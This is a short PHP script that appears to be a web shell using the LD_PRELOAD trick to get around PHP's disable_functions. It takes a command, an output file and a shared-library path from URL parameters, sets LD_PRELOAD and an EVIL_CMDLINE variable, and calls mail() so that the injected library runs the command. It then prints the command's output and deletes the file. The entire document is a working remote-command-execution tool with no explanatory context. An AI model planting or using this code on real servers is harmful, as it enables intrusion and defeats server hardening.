<?php
    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "cmdline".$evil_cmdline;
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);
    echo getenv('LD_PRELOAD');
    mail("", "", "", "");
    echo "output" . nl2br(file_get_contents($out_path)); 
    unlink($out_path);
?>